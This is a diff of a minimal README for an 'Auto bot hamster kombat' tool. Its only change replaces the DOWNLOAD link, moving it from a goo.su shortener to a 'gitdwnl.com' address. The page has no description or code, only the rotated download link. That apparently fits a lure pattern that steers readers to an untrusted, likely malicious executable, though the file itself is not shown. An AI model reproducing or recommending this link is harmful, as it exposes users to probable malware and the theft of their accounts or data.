@@ -1,7 +1,7 @@
 <h1 align="center">Auto bot hamster kombat</h1>
 
 
-[DOWNLOAD](https://goo.su/giasns)
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
 
 
